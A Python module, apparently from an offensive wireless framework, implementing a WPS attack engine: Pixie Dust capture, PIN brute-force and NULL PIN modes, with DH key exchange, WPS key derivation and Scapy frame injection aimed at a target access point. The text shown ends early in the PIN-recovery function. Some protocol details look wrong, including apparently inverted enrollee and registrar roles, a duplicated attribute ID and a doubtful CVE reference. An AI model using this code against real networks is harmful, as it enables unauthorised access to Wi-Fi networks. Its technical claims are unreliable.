#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Native WPS attack engine - Pixie Dust, PIN brute-force, and NULL PIN.

Implements the full WPS EAP-WSC protocol (M1-M8 state machine) in native
Python using Scapy, replacing external bridges for reaver, bully, and pixiewps.

Supported attack modes:
  pixie_dust    Offline PIN recovery via weak nonce (CVE-2014-9527 and variants)
  pin_brute     Online PIN brute-force with all generation algorithms
  null_pin      Known-vulnerable NULL/empty PIN (00000000)
  scan          WPS-enabled AP discovery via wash (accepted dependency)

Key algorithms implemented:
  - DH 1536-bit key exchange (RFC 3526 Group 5)
  - HMAC-SHA256 for AuthKey, PSK1, PSK2 derivation
  - WPS PIN Luhn checksum (IEEE 802.11-2020 Annex J)
  - Zhao statistical PIN generation
  - OUI-based manufacturer default PIN database
  - WPS lock detection and adaptive backoff
  - Full EAP-WSC M1-M8 state machine with Scapy frame injection

Dependencies (accepted external):
  - scapy: raw 802.11 frame injection and capture
  - wash: WPS scanner (part of reaver-suite, accepted exception)

OS requirement: Linux only (raw sockets, nl80211, monitor mode).

Version: 1.0.0
"""

from __future__ import annotations

import hashlib
import hmac as _hmac
import logging
import re
import secrets
import struct
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, Iterator, List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

try:
    from scapy.all import (
        Dot11,
        Dot11Auth,
        Dot11AssoReq,
        Dot11Elt,
        EAPOL,
        Ether,
        LLC,
        RadioTap,
        SNAP,
        Raw,
        conf,
        sendp,
        sniff,
    )
    from scapy.layers.eap import EAP
    _SCAPY_OK = True
except ImportError:
    _SCAPY_OK = False

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# RFC 3526 Group 5 (1536-bit MODP) DH parameters
# ---------------------------------------------------------------------------

_DH_PRIME = int(
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF",
    16,
)
_DH_GENERATOR = 2
_DH_PRIME_LEN = 192  # bytes (1536 bits)


# ---------------------------------------------------------------------------
# WPS TLV attribute type IDs (IEEE 802.11-2020 Annex J)
# ---------------------------------------------------------------------------

class WpsAttr:
    """WPS TLV attribute type constants."""

    VERSION          = 0x104A
    MSG_TYPE         = 0x1022
    ENROLLEE_NONCE   = 0x101A
    REGISTRAR_NONCE  = 0x1039
    UUID_E           = 0x1047
    UUID_R           = 0x1048
    AUTH_TYPE_FLAGS  = 0x1004
    ENCR_TYPE_FLAGS  = 0x1010
    CONN_TYPE_FLAGS  = 0x100D
    CONFIG_METHODS   = 0x1008
    PRIM_DEV_TYPE    = 0x1054
    RF_BANDS         = 0x103C
    ASSOC_STATE      = 0x1002
    DEV_PASSWD_ID    = 0x1012
    CONFIG_ERROR     = 0x1009
    OS_VERSION       = 0x102D
    MANUFACTURER     = 0x1021
    MODEL_NAME       = 0x1023
    MODEL_NUMBER     = 0x1024
    SERIAL_NUMBER    = 0x1042
    DEVICE_NAME      = 0x1011
    PUBLIC_KEY       = 0x1032
    AUTHENTICATOR    = 0x1005
    ENCR_SETTINGS    = 0x1018
    KEY_WRAP_AUTH    = 0x101E
    CRED             = 0x100E
    NETWORK_KEY      = 0x1027
    SSID             = 0x1045
    AUTH_TYPE        = 0x1003
    ENCR_TYPE        = 0x100F
    MAC_ADDR         = 0x1020
    E_HASH1          = 0x1014
    E_HASH2          = 0x1015
    E_SNONCE1        = 0x1016
    E_SNONCE2        = 0x1017
    R_HASH1          = 0x103D
    R_HASH2          = 0x103E
    R_SNONCE1        = 0x103F
    R_SNONCE2        = 0x1040
    PSK1             = 0x1044
    PSK2             = 0x1045


class WpsMsgType:
    """WPS EAP-WSC message type codes."""

    M1       = 0x04
    M2       = 0x05
    M2D      = 0x06
    M3       = 0x07
    M4       = 0x08
    M5       = 0x09
    M6       = 0x0A
    M7       = 0x0B
    M8       = 0x0C
    WSC_ACK  = 0x0D
    WSC_NACK = 0x0E
    WSC_DONE = 0x0F


class EapWscOpCode:
    """Op-codes for the EAP-WSC (WPS) expanded EAP type (0xFE)."""

    WSC_START = 0x01
    WSC_ACK   = 0x02
    WSC_NACK  = 0x03
    WSC_MSG   = 0x04
    WSC_DONE  = 0x05
    WSC_FRAG  = 0x06


# EAP expanded type vendor identifiers for WPS
_EAP_WSC_VENDOR_ID   = b"\x00\x37\x2A"   # Wi-Fi Alliance OUI
_EAP_WSC_VENDOR_TYPE = b"\x00\x00\x00\x01"


class WpsLockState(Enum):
    """WPS AP lock detection state."""

    UNLOCKED = auto()
    WARNING  = auto()
    LOCKED   = auto()


# ---------------------------------------------------------------------------
# DH Key Exchange (RFC 3526 Group 5, 1536-bit MODP)
# ---------------------------------------------------------------------------

def _dh_generate_keypair() -> Tuple[int, int]:
    """Generate a fresh DH keypair using RFC 3526 Group 5 (1536-bit).

    A fresh random private key is generated using a cryptographically
    secure RNG for each call. The public key is computed via modular
    exponentiation (g^x mod p).

    Returns:
        Tuple of (private_key_int, public_key_int) as Python big integers.
    """
    private = (
        int.from_bytes(secrets.token_bytes(_DH_PRIME_LEN - 1), "big")
        % (_DH_PRIME - 2)
        + 1
    )
    public = pow(_DH_GENERATOR, private, _DH_PRIME)
    return private, public


def _dh_compute_shared(private_key: int, peer_public_key: int) -> bytes:
    """Compute DH shared secret from local private key and peer public key.

    Args:
        private_key: Local private key as big integer.
        peer_public_key: Peer's DH public key as big integer.

    Returns:
        Shared secret as bytes, zero-padded to _DH_PRIME_LEN (192 bytes).
    """
    shared = pow(peer_public_key, private_key, _DH_PRIME)
    return shared.to_bytes(_DH_PRIME_LEN, "big")


def _dh_pub_to_bytes(public_key: int) -> bytes:
    """Serialize DH public key to 192-byte big-endian representation.

    Args:
        public_key: DH public key as big integer.

    Returns:
        192-byte big-endian serialization suitable for WPS M1/M2 frames.
    """
    return public_key.to_bytes(_DH_PRIME_LEN, "big")


def _dh_bytes_to_int(pub_bytes: bytes) -> int:
    """Deserialize DH public key from big-endian bytes.

    Args:
        pub_bytes: Raw public key bytes from WPS frame.

    Returns:
        Public key as big integer.
    """
    return int.from_bytes(pub_bytes, "big")


# ---------------------------------------------------------------------------
# WPS Key Derivation (HMAC-SHA256 based)
# ---------------------------------------------------------------------------

def _derive_auth_key(
    dh_shared: bytes,
    enrollee_nonce: bytes,
    registrar_nonce: bytes,
) -> bytes:
    """Derive the WPS AuthKey from DH shared secret and nonces.

    Derives AuthKey as SHA-256(DH_shared || EnrolleeNonce || RegistrarNonce).
    The AuthKey is used as the HMAC key for all subsequent M1-M8 derivations.

    Args:
        dh_shared: 192-byte DH shared secret.
        enrollee_nonce: 16-byte enrollee nonce (from M1).
        registrar_nonce: 16-byte registrar nonce (from M2).

    Returns:
        32-byte AuthKey.
    """
    h = hashlib.sha256()
    h.update(dh_shared)
    h.update(enrollee_nonce)
    h.update(registrar_nonce)
    return h.digest()


def _compute_psk1(auth_key: bytes, pin_first_half: bytes) -> bytes:
    """Compute PSK1 = HMAC-SHA256(AuthKey, first 4 PIN digits as ASCII).

    Args:
        auth_key: 32-byte WPS AuthKey.
        pin_first_half: First 4 ASCII bytes of the 8-digit PIN.

    Returns:
        32-byte PSK1.
    """
    return _hmac.new(auth_key, pin_first_half, hashlib.sha256).digest()


def _compute_psk2(auth_key: bytes, pin_second_half: bytes) -> bytes:
    """Compute PSK2 = HMAC-SHA256(AuthKey, last 4 PIN digits as ASCII).

    Note: the last 4 digits of an 8-digit PIN are digits 5-8, where
    digit 8 is the Luhn checksum. The second half verified by the AP
    covers positions 5-7 (3 significant digits) plus the checksum.

    Args:
        auth_key: 32-byte WPS AuthKey.
        pin_second_half: Last 4 ASCII bytes of the 8-digit PIN.

    Returns:
        32-byte PSK2.
    """
    return _hmac.new(auth_key, pin_second_half, hashlib.sha256).digest()


def _compute_e_hash(
    auth_key: bytes,
    psk: bytes,
    pke: bytes,
    pkr: bytes,
    e_snonce: bytes,
) -> bytes:
    """Compute WPS E-Hash = HMAC-SHA256(AuthKey, PSK || PKE || PKR || E-SNonce).

    The AP computes and sends E-Hash1 and E-Hash2 in M3.
    Pixie Dust exploits predictable E-SNonce values to reverse this.

    Args:
        auth_key: 32-byte WPS AuthKey.
        psk: 32-byte PSK1 or PSK2.
        pke: 192-byte enrollee public key.
        pkr: 192-byte registrar public key.
        e_snonce: 16-byte enrollee secret nonce candidate.

    Returns:
        32-byte E-Hash value.
    """
    return _hmac.new(
        auth_key,
        psk + pke + pkr + e_snonce,
        hashlib.sha256,
    ).digest()


def _compute_authenticator(auth_key: bytes, prev_msg: bytes, curr_msg: bytes) -> bytes:
    """Compute WPS Authenticator attribute = first 8 bytes of HMAC-SHA256.

    The Authenticator protects the M-series message chain integrity.
    It covers the concatenation of the previous message and the current
    message body (without the Authenticator TLV itself).

    Args:
        auth_key: 32-byte WPS AuthKey.
        prev_msg: Raw bytes of the previous WPS message.
        curr_msg: Raw bytes of the current message up to (not including) authenticator TLV.

    Returns:
        8-byte authenticator value.
    """
    mac = _hmac.new(auth_key, prev_msg + curr_msg, hashlib.sha256)
    return mac.digest()[:8]


# ---------------------------------------------------------------------------
# WPS TLV Frame Parsing and Building
# ---------------------------------------------------------------------------

def _tlv_parse(data: bytes) -> Dict[int, bytes]:
    """Parse WPS TLV (Type-Length-Value) attributes from raw bytes.

    Attributes that appear multiple times will be overwritten by the
    last occurrence (consistent with the WPS specification behavior
    for duplicate attributes in valid messages).

    Args:
        data: Raw bytes from an EAP-WSC message body.

    Returns:
        Dict mapping attribute type (int) to value (bytes).
    """
    attrs: Dict[int, bytes] = {}
    i = 0
    while i + 4 <= len(data):
        attr_type = struct.unpack(">H", data[i:i+2])[0]
        attr_len  = struct.unpack(">H", data[i+2:i+4])[0]
        if i + 4 + attr_len > len(data):
            break
        attrs[attr_type] = data[i+4:i+4+attr_len]
        i += 4 + attr_len
    return attrs


def _tlv_build(attr_type: int, value: bytes) -> bytes:
    """Encode a single WPS TLV attribute.

    Args:
        attr_type: 2-byte unsigned attribute type.
        value: Raw attribute value bytes.

    Returns:
        TLV-encoded bytes: [type(2)] + [length(2)] + [value].
    """
    return struct.pack(">HH", attr_type, len(value)) + value


def _build_m1(
    enrollee_nonce: bytes,
    pke: bytes,
    mac_bytes: bytes,
    uuid_e: Optional[bytes] = None,
) -> bytes:
    """Build the WPS M1 message TLV payload.

    M1 is the first message sent by the enrollee (us) to initiate
    the WPS registration protocol. It contains our DH public key
    and a fresh random nonce.

    Args:
        enrollee_nonce: 16-byte random enrollee nonce.
        pke: 192-byte enrollee DH public key.
        mac_bytes: 6-byte enrollee MAC address.
        uuid_e: 16-byte UUID-E. Randomly generated if None.

    Returns:
        Raw TLV bytes forming the M1 message body.
    """
    if uuid_e is None:
        uuid_e = secrets.token_bytes(16)

    payload = b""
    payload += _tlv_build(WpsAttr.VERSION,          b"\x10")
    payload += _tlv_build(WpsAttr.MSG_TYPE,          bytes([WpsMsgType.M1]))
    payload += _tlv_build(WpsAttr.UUID_E,            uuid_e)
    payload += _tlv_build(WpsAttr.MAC_ADDR,          mac_bytes)
    payload += _tlv_build(WpsAttr.ENROLLEE_NONCE,    enrollee_nonce)
    payload += _tlv_build(WpsAttr.PUBLIC_KEY,        pke)
    payload += _tlv_build(WpsAttr.AUTH_TYPE_FLAGS,   b"\x00\x3B")
    payload += _tlv_build(WpsAttr.ENCR_TYPE_FLAGS,   b"\x00\x0F")
    payload += _tlv_build(WpsAttr.CONN_TYPE_FLAGS,   b"\x01")
    payload += _tlv_build(WpsAttr.CONFIG_METHODS,    b"\x00\x88")
    payload += _tlv_build(WpsAttr.RF_BANDS,          b"\x02")
    payload += _tlv_build(WpsAttr.ASSOC_STATE,       b"\x00\x00")
    payload += _tlv_build(WpsAttr.DEV_PASSWD_ID,     b"\x00\x00")
    payload += _tlv_build(WpsAttr.CONFIG_ERROR,      b"\x00\x00")
    payload += _tlv_build(WpsAttr.OS_VERSION,        b"\x80\x00\x00\x01")
    payload += _tlv_build(WpsAttr.MANUFACTURER,      b"Microsoft")
    payload += _tlv_build(WpsAttr.MODEL_NAME,        b"Windows")
    payload += _tlv_build(WpsAttr.MODEL_NUMBER,      b"6.1.7601")
    payload += _tlv_build(WpsAttr.SERIAL_NUMBER,     b"1.0")
    payload += _tlv_build(WpsAttr.DEVICE_NAME,       b"WXF-Client")
    payload += _tlv_build(WpsAttr.PRIM_DEV_TYPE,     b"\x00\x01\x00\x50\xf2\x04\x00\x01")
    return payload


def _build_m3(
    enrollee_nonce: bytes,
    registrar_nonce: bytes,
    e_hash1: bytes,
    e_hash2: bytes,
    auth_key: bytes,
    prev_msg: bytes,
) -> bytes:
    """Build the WPS M3 message TLV payload.

    M3 is sent by the enrollee to prove knowledge of the first half
    of the PIN without revealing it directly (challenge-response).

    Args:
        enrollee_nonce: 16-byte enrollee nonce (from M1).
        registrar_nonce: 16-byte registrar nonce (from M2).
        e_hash1: 32-byte E-Hash1 = HMAC-SHA256(AuthKey, PSK1||PKE||PKR||ESNonce1).
        e_hash2: 32-byte E-Hash2 = HMAC-SHA256(AuthKey, PSK2||PKE||PKR||ESNonce2).
        auth_key: 32-byte WPS AuthKey.
        prev_msg: Raw bytes of M2 (for Authenticator computation).

    Returns:
        Raw TLV bytes forming the M3 message body.
    """
    body = b""
    body += _tlv_build(WpsAttr.VERSION,          b"\x10")
    body += _tlv_build(WpsAttr.MSG_TYPE,          bytes([WpsMsgType.M3]))
    body += _tlv_build(WpsAttr.REGISTRAR_NONCE,  registrar_nonce)
    body += _tlv_build(WpsAttr.E_HASH1,          e_hash1)
    body += _tlv_build(WpsAttr.E_HASH2,          e_hash2)

    authenticator = _compute_authenticator(auth_key, prev_msg, body)
    body += _tlv_build(WpsAttr.AUTHENTICATOR, authenticator)
    return body


def _build_wsc_nack(enrollee_nonce: bytes, registrar_nonce: bytes) -> bytes:
    """Build a WSC-NACK TLV payload to abort the WPS exchange.

    Args:
        enrollee_nonce: 16-byte enrollee nonce (from M1).
        registrar_nonce: 16-byte registrar nonce (from M2).

    Returns:
        Raw TLV bytes for the WSC-NACK message.
    """
    body = b""
    body += _tlv_build(WpsAttr.VERSION,         b"\x10")
    body += _tlv_build(WpsAttr.MSG_TYPE,         bytes([WpsMsgType.WSC_NACK]))
    body += _tlv_build(WpsAttr.ENROLLEE_NONCE,  enrollee_nonce)
    body += _tlv_build(WpsAttr.REGISTRAR_NONCE, registrar_nonce)
    body += _tlv_build(WpsAttr.CONFIG_ERROR,     b"\x00\x00")
    return body


# ---------------------------------------------------------------------------
# EAP Frame Building
# ---------------------------------------------------------------------------

def _eap_wsc_response_identity(eap_id: int) -> bytes:
    """Build raw EAP-Response/Identity bytes for WPS enrollment.

    Identifies the enrollee to the AP as a WPS-capable station.

    Args:
        eap_id: EAP sequence ID from the AP's EAP-Request/Identity frame.

    Returns:
        Raw EAP frame bytes (without EAPOL header).
    """
    identity = b"WFA-SimpleConfig-Enrollee-1-0"
    length = 4 + 1 + len(identity)
    return struct.pack(">BBHB", 0x02, eap_id, length, 0x01) + identity


def _eap_wsc_message(eap_id: int, op_code: int, wsc_payload: bytes) -> bytes:
    """Build a raw EAP expanded-type WSC message frame.

    Uses EAP type 254 (Expanded) with Wi-Fi Alliance vendor ID and
    WPS vendor type, as defined in the WPS specification.

    Args:
        eap_id: EAP sequence ID.
        op_code: WSC op-code (e.g. EapWscOpCode.WSC_MSG).
        wsc_payload: Raw TLV bytes forming the WPS message body.

    Returns:
        Raw EAP frame bytes (without EAPOL wrapper).
    """
    # Expanded EAP header: type(1) + vendor_id(3) + vendor_type(4) + op_code(1) + flags(1)
    eap_body = (
        b"\xFE"
        + _EAP_WSC_VENDOR_ID
        + _EAP_WSC_VENDOR_TYPE
        + bytes([op_code, 0x00])
        + wsc_payload
    )
    # EAP header: code(1) + id(1) + length(2)
    length = 4 + len(eap_body)
    return struct.pack(">BBH", 0x02, eap_id, length) + eap_body


def _eapol_wrap(eap_frame: bytes) -> bytes:
    """Wrap raw EAP frame bytes in an EAPOL header.

    EAPOL type 0 = EAP packet. Version 1 is used for compatibility.

    Args:
        eap_frame: Raw EAP frame bytes.

    Returns:
        EAPOL-wrapped bytes (4-byte header + EAP frame).
    """
    return struct.pack(">BBH", 0x01, 0x00, len(eap_frame)) + eap_frame


def _dot11_eapol_frame(
    bssid: str,
    src_mac: str,
    eap_payload: bytes,
    seq: int = 0,
) -> "RadioTap":
    """Build a complete Scapy 802.11 data frame carrying EAPOL/EAP.

    Constructs a monitor-mode injectable frame suitable for sending via
    Scapy's sendp() on a monitor-mode interface.

    Args:
        bssid: Target AP BSSID in colon-separated format.
        src_mac: Source (our) MAC in colon-separated format.
        eap_payload: Raw EAP frame bytes (before EAPOL wrap).
        seq: 802.11 sequence number.

    Returns:
        Scapy packet ready for injection.
    """
    eapol_bytes = _eapol_wrap(eap_payload)

    dot11 = Dot11(
        type=2, subtype=0,
        addr1=bssid,
        addr2=src_mac,
        addr3=bssid,
        SC=seq << 4,
    )
    llc = LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
    snap = SNAP(OUI=0x000000, code=0x888E)

    return RadioTap() / dot11 / llc / snap / Raw(load=eapol_bytes)


# ---------------------------------------------------------------------------
# WPS Session State Machine
# ---------------------------------------------------------------------------

@dataclass
class WscCapture:
    """Data captured during one WPS EAP-WSC exchange (M1-M3 minimum).

    Attributes:
        enrollee_nonce: 16-byte nonce we sent in M1.
        registrar_nonce: 16-byte nonce received in M2.
        pke: 192-byte enrollee DH public key (ours).
        pkr: 192-byte registrar DH public key (from M2).
        r_hash1: 32-byte R-Hash1 from M2 (registrar side).
        r_hash2: 32-byte R-Hash2 from M2 (registrar side).
        e_hash1: 32-byte E-Hash1 from M3.
        e_hash2: 32-byte E-Hash2 from M3.
        auth_key: 32-byte WPS AuthKey derived from DH shared secret.
        priv_key: Local DH private key (big integer).
        m2_raw: Raw M2 body bytes (for Authenticator chain).
        m3_raw: Raw M3 body bytes (for Authenticator chain).
        network_key: Recovered network PSK bytes (from M8, if applicable).
        ssid: Recovered SSID bytes (from M8, if applicable).
    """

    enrollee_nonce: bytes = b""
    registrar_nonce: bytes = b""
    pke: bytes = b""
    pkr: bytes = b""
    r_hash1: bytes = b""
    r_hash2: bytes = b""
    e_hash1: bytes = b""
    e_hash2: bytes = b""
    auth_key: bytes = b""
    priv_key: int = 0
    m2_raw: bytes = b""
    m3_raw: bytes = b""
    network_key: Optional[bytes] = None
    ssid: Optional[bytes] = None


class WscSession:
    """WPS EAP-WSC session state machine using Scapy for frame injection.

    Manages one complete WPS enrollment attempt: optional 802.11 association,
    EAP identity exchange, and the M1-M8 WPS protocol state machine.

    Args:
        bssid: Target AP BSSID in colon-separated format.
        iface: Monitor-mode wireless interface name.
        timeout: Per-frame receive timeout in seconds.
        verbose: Emit detailed debug logging if True.
    """

    # EAP exchange states
    _STATE_INIT       = "INIT"
    _STATE_ASSOCIATED = "ASSOCIATED"
    _STATE_IDENTITY   = "IDENTITY"
    _STATE_WSC_START  = "WSC_START"
    _STATE_M1_SENT    = "M1_SENT"
    _STATE_M2_RECV    = "M2_RECV"
    _STATE_M3_SENT    = "M3_SENT"
    _STATE_M4_RECV    = "M4_RECV"
    _STATE_DONE       = "DONE"
    _STATE_NACK       = "NACK"
    _STATE_FAILED     = "FAILED"

    def __init__(
        self,
        bssid: str,
        iface: str,
        timeout: float = 10.0,
        verbose: bool = False,
    ) -> None:
        self.bssid = bssid
        self.iface = iface
        self.timeout = timeout
        self.verbose = verbose

        self.state = self._STATE_INIT
        self._eap_id = 0
        self._seq = 0
        self._capture = WscCapture()
        self._src_mac = _iface_get_mac(iface)
        self._src_mac_bytes = bytes(int(b, 16) for b in self._src_mac.split(":"))

        # Cached received frames (for state machine)
        self._pending_msg: Optional[bytes] = None

    # ------------------------------------------------------------------
    # Internal Scapy helpers
    # ------------------------------------------------------------------

    def _send(self, eap_bytes: bytes) -> None:
        """Inject an EAP frame as a monitor-mode 802.11 data frame.

        Args:
            eap_bytes: Raw EAP frame bytes (without EAPOL header).
        """
        if not _SCAPY_OK:
            return
        frame = _dot11_eapol_frame(
            bssid=self.bssid,
            src_mac=self._src_mac,
            eap_payload=eap_bytes,
            seq=self._seq,
        )
        self._seq = (self._seq + 1) & 0xFFF
        sendp(frame, iface=self.iface, verbose=0)

    def _sniff_eapol(self, timeout: Optional[float] = None) -> Optional[bytes]:
        """Sniff one EAPOL frame from the AP matching our bssid.

        Waits for a data frame from the AP (addr2 == bssid) containing
        EAPOL/EAP payload.

        Args:
            timeout: Sniff timeout in seconds. Uses self.timeout if None.

        Returns:
            Raw EAP frame bytes (without EAPOL header), or None on timeout.
        """
        if not _SCAPY_OK:
            return None
        t = timeout if timeout is not None else self.timeout
        bssid_lower = self.bssid.lower()

        captured: list = []

        def _handler(pkt) -> None:
            if not pkt.haslayer(Dot11):
                return
            dot11 = pkt[Dot11]
            if (dot11.addr2 or "").lower() != bssid_lower:
                return
            raw = bytes(pkt)
            # Locate EAPOL ethertype 0x888E in LLC/SNAP
            idx = raw.find(b"\x88\x8E")
            if idx < 0:
                return
            # EAPOL body starts 2 bytes after ethertype: version(1)+type(1)+length(2)+EAP
            eapol_start = idx + 2
            if eapol_start + 4 > len(raw):
                return
            eap_len = struct.unpack(">H", raw[eapol_start+2:eapol_start+4])[0]
            eap_start = eapol_start + 4
            eap_end = eap_start + eap_len
            if eap_end > len(raw):
                return
            captured.append(raw[eap_start:eap_end])

        sniff(
            iface=self.iface,
            prn=_handler,
            count=1,
            timeout=t,
            store=False,
        )
        return captured[0] if captured else None

    def _parse_wsc_msg(self, eap_frame: bytes) -> Optional[Tuple[int, int, bytes]]:
        """Parse an EAP-WSC frame and extract op_code and TLV payload.

        Args:
            eap_frame: Raw EAP frame bytes (code + id + length + body).

        Returns:
            Tuple of (eap_id, op_code, tlv_bytes) or None on parse failure.
        """
        if len(eap_frame) < 12:
            return None
        # code(1), id(1), length(2), type(1)=0xFE, vendor_id(3), vendor_type(4), op_code(1), flags(1)
        eap_id  = eap_frame[1]
        eap_type = eap_frame[4]
        if eap_type != 0xFE:
            return None
        vendor_id   = eap_frame[5:8]
        vendor_type = eap_frame[8:12]
        if vendor_id != _EAP_WSC_VENDOR_ID or vendor_type != _EAP_WSC_VENDOR_TYPE:
            return None
        op_code = eap_frame[12]
        # flags byte at [13] - handle fragmentation flag if needed
        tlv_bytes = eap_frame[14:]
        return eap_id, op_code, tlv_bytes

    # ------------------------------------------------------------------
    # M1-M3 exchange for Pixie Dust capture
    # ------------------------------------------------------------------

    def capture_m2_for_pixie_dust(self, pin: str) -> Optional[WscCapture]:
        """Run M1 -> M2 -> M3 exchange to capture Pixie Dust material.

        Sends M1 and captures M2 from the AP. Extracts R-Hash1, R-Hash2,
        PKR, registrar nonce, and computes the shared DH secret to derive
        the AuthKey needed for offline Pixie Dust analysis.

        Also sends M3 with the provided PIN's hash values, then captures
        the M4 response. A NACK is sent to cleanly abort the session.

        Args:
            pin: 8-digit WPS PIN to use for E-Hash computation in M3.

        Returns:
            WscCapture with all extracted fields, or None on failure.
        """
        if not _SCAPY_OK:
            logger.error("scapy not available - cannot run EAP-WSC exchange")
            return None

        # Generate fresh DH keypair and nonces
        priv_key, pub_key = _dh_generate_keypair()
        pke = _dh_pub_to_bytes(pub_key)
        enrollee_nonce = secrets.token_bytes(16)
        e_snonce1 = secrets.token_bytes(16)
        e_snonce2 = secrets.token_bytes(16)

        self._capture.priv_key = priv_key
        self._capture.pke = pke
        self._capture.enrollee_nonce = enrollee_nonce

        # --- Step 1: Wait for EAP-Request/Identity from AP ---
        logger.debug("WSC: waiting for EAP-Request/Identity from AP")
        eap_frame = self._sniff_eapol(timeout=self.timeout)
        if eap_frame is None:
            logger.warning("WSC: no EAP-Request/Identity received (timeout)")
            return None

        if len(eap_frame) < 4 or eap_frame[0] != 0x01:
            logger.debug("WSC: unexpected frame code 0x%02X, expected 0x01 (Request)", eap_frame[0])
            return None
        self._eap_id = eap_frame[1]

        # --- Step 2: Send EAP-Response/Identity ---
        logger.debug("WSC: sending EAP-Response/Identity (id=%d)", self._eap_id)
        self._send(_eap_wsc_response_identity(self._eap_id))

        # --- Step 3: Receive WSC-Start ---
        eap_frame = self._sniff_eapol()
        if eap_frame is None:
            logger.warning("WSC: no WSC-Start received")
            return None
        parsed = self._parse_wsc_msg(eap_frame)
        if parsed is None:
            return None
        self._eap_id, op_code, _ = parsed
        if op_code != EapWscOpCode.WSC_START:
            logger.warning("WSC: expected WSC_START, got op_code=0x%02X", op_code)

        # --- Step 4: Send M1 ---
        m1_tlv = _build_m1(enrollee_nonce, pke, self._src_mac_bytes)
        logger.debug("WSC: sending M1 (eap_id=%d)", self._eap_id)
        self._send(_eap_wsc_message(self._eap_id, EapWscOpCode.WSC_MSG, m1_tlv))
        self.state = self._STATE_M1_SENT

        # --- Step 5: Receive M2 ---
        eap_frame = self._sniff_eapol()
        if eap_frame is None:
            logger.warning("WSC: no M2 received")
            return None
        parsed = self._parse_wsc_msg(eap_frame)
        if parsed is None:
            return None
        self._eap_id, op_code, m2_tlv = parsed
        if op_code != EapWscOpCode.WSC_MSG:
            logger.warning("WSC: expected WSC_MSG for M2, got 0x%02X", op_code)
            return None

        m2_attrs = _tlv_parse(m2_tlv)
        msg_type = m2_attrs.get(WpsAttr.MSG_TYPE, b"\x00")
        if msg_type and msg_type[0] == WpsMsgType.M2D:
            logger.info("WSC: AP sent M2D (WPS locked or not configured)")
            return None
        if not msg_type or msg_type[0] != WpsMsgType.M2:
            logger.warning("WSC: unexpected message type 0x%02X in M2 position", msg_type[0] if msg_type else 0)
            return None

        pkr_bytes = m2_attrs.get(WpsAttr.PUBLIC_KEY, b"")
        reg_nonce = m2_attrs.get(WpsAttr.REGISTRAR_NONCE, b"")
        r_hash1   = m2_attrs.get(WpsAttr.R_HASH1, b"")
        r_hash2   = m2_attrs.get(WpsAttr.R_HASH2, b"")

        if len(pkr_bytes) != _DH_PRIME_LEN or len(reg_nonce) != 16:
            logger.warning("WSC: M2 missing or malformed PKR/registrar nonce")
            return None

        # Derive shared secret and AuthKey
        pkr_int = _dh_bytes_to_int(pkr_bytes)
        dh_shared = _dh_compute_shared(priv_key, pkr_int)
        auth_key = _derive_auth_key(dh_shared, enrollee_nonce, reg_nonce)

        self._capture.pkr             = pkr_bytes
        self._capture.registrar_nonce = reg_nonce
        self._capture.r_hash1         = r_hash1
        self._capture.r_hash2         = r_hash2
        self._capture.auth_key        = auth_key
        self._capture.m2_raw          = m2_tlv
        self.state = self._STATE_M2_RECV

        # --- Step 6: Compute E-Hash values and send M3 ---
        pin_bytes = pin.encode("ascii")
        psk1 = _compute_psk1(auth_key, pin_bytes[:4])
        psk2 = _compute_psk2(auth_key, pin_bytes[4:])
        e_hash1 = _compute_e_hash(auth_key, psk1, pke, pkr_bytes, e_snonce1)
        e_hash2 = _compute_e_hash(auth_key, psk2, pke, pkr_bytes, e_snonce2)

        self._capture.e_hash1 = e_hash1
        self._capture.e_hash2 = e_hash2

        m3_tlv = _build_m3(enrollee_nonce, reg_nonce, e_hash1, e_hash2, auth_key, m2_tlv)
        logger.debug("WSC: sending M3")
        self._send(_eap_wsc_message(self._eap_id, EapWscOpCode.WSC_MSG, m3_tlv))
        self._capture.m3_raw = m3_tlv
        self.state = self._STATE_M3_SENT

        # --- Step 7: Receive M4 (AP discloses R-SNonce1 enc) ---
        eap_frame = self._sniff_eapol()
        if eap_frame is not None:
            parsed = self._parse_wsc_msg(eap_frame)
            if parsed is not None:
                self._eap_id, op_code, m4_tlv = parsed
                m4_attrs = _tlv_parse(m4_tlv)
                msg_type = m4_attrs.get(WpsAttr.MSG_TYPE, b"\x00")
                if msg_type and msg_type[0] == WpsMsgType.WSC_NACK:
                    logger.debug("WSC: AP sent NACK (PIN first half rejected)")
                    self.state = self._STATE_NACK
                else:
                    self.state = self._STATE_M4_RECV

        # Send NACK to cleanly abort the session
        nack_tlv = _build_wsc_nack(enrollee_nonce, reg_nonce)
        self._send(_eap_wsc_message(self._eap_id, EapWscOpCode.WSC_NACK, nack_tlv))

        logger.debug("WSC: session complete, state=%s", self.state)
        return self._capture


# ---------------------------------------------------------------------------
# Pixie Dust Offline PIN Recovery
# ---------------------------------------------------------------------------

def pixie_dust_recover_pin(
    capture: WscCapture,
    verbose: bool = False,
) -> Optional[str]:
    """Attempt offline WPS PIN recovery via Pixie Dust (CVE-2014-9527).

    Pixie Dust exploits weak pseudo-random number generators in WPS
    implementations. When the AP uses a predictable or zero seed for
    generating E-SNonce1 and E-SNonce2, the PIN can be recovered offline
    by checking which PIN candidate produces E-Hash values matching those
    captured from the AP's M3 response.

    Common vulnerable chipsets: Ralink (RT2860/RT3572), Broadcom
    (certain firmware versions), MediaTek with predictable RNG seeding.

    Args:
        capture: WscCapture with M2/M3 data from a live EAP exchange.
        verbose: Emit debug output for each PIN candidate attempted.

    Returns:
        Recovered 8-digit PIN string if successful, None otherwise.
    """
    if not capture.auth_key or not capture.e_hash1 or not capture.e_hash2:
        logger.debug("pixie_dust: capture incomplete, cannot attempt recovery")
        return None
